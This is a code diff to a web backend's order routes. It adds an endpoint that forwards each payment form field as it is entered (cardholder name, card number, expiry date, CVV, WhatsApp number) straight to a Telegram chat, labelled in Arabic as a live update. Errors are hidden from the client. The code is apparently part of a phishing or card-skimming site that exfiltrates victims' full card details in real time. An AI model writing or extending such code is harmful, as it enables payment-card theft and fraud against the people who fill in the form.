@@ -7,6 +7,7 @@ import {
   SubmitContactBody,
   SubmitCodeBody,
   DecideOrderBody,
+  TrackFieldBody,
 } from "@workspace/api-zod";
 import { sendTelegramMessage, answerCallbackQuery } from "../lib/telegram";
 
@@ -97,6 +98,33 @@ router.post("/orders/:orderId/contact", async (req, res) => {
   } catch (err: any) {
     req.log.error({ err }, "Error submitting contact");
     res.status(400).json({ error: err.message });
+  }
+});
+
+const FIELD_LABELS: Record<string, string> = {
+  cardName: "👤 اسم صاحب البطاقة",
+  cardNumber: "🔢 رقم البطاقة",
+  cardExpiry: "📅 تاريخ الانتهاء",
+  cardCvv: "🔐 رمز CVV",
+  whatsapp: "📞 واتساب",
+  name: "👤 الاسم",
+};
+
+router.post("/orders/:orderId/field", async (req, res) => {
+  try {
+    const { orderId } = req.params;
+    const body = TrackFieldBody.parse(req.body);
+
+    const label = FIELD_LABELS[body.fieldName] || body.fieldName;
+    await sendTelegramMessage(
+      `✏️ <b>تحديث مباشر</b> — طلب <code>${orderId}</code>\n\n` +
+        `${label}: <code>${body.fieldValue}</code>`
+    );
+
+    res.json({ ok: true });
+  } catch (err: any) {
+    req.log.error({ err }, "Error tracking field");
+    res.json({ ok: true });
   }
 });
 
